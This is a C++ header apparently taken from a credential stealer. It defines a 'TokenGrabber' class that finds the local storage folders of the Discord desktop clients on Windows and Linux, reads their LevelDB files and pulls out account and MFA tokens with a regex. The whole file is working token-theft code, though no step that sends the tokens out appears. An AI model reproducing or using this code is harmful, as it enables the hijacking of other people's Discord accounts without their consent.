#pragma once

#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <regex>
namespace fs = std::filesystem;

class TokenGrabber
{
    #ifdef _WIN32
    inline static std::string appdataPath = std::string(getenv("APPDATA")) + "/";
    #else
    inline static std::string appdataPath = std::string(getenv("HOME")) + "/.config/";
    #endif
public:
    constexpr static auto PLATFORM_DISCORD = "discord";
    constexpr static auto PLATFORM_DISCORD_CANARY = "discordcanary";
    constexpr static auto PLATFORM_DISCORD_DEVELOPMENT = "discorddevelopment";
    constexpr static auto PLATFORM_DISCORD_PTB = "discordptb";

    static bool platformDataExists(const std::string& platform)
    {
        return fs::exists(appdataPath + platform + "/Local Storage/leveldb");
    }

    static std::vector<std::string> getTokensFromPlatform(const std::string& platform)
    {
        std::vector<std::string> tokens;
        const std::regex tokenRegex("[\\w-_]{24}\\.[\\w-_]{6}\\.[\\w-_]{27}|mfa\\.[\\w-]{84}");

        for (const fs::directory_entry& entry : fs::directory_iterator(appdataPath + platform + "/Local Storage/leveldb"))
        {
            if (entry.path().extension() == ".ldb")
            {
                std::ifstream dbFile(entry.path().string());
                const std::string contents((std::istreambuf_iterator<char>(dbFile)), std::istreambuf_iterator<char>());
                
                std::smatch match;
                if (std::regex_search(contents, match, tokenRegex))
                {
                    tokens.assign(match.begin(), match.end());
                }
            }
        }

        return tokens;
    }
};
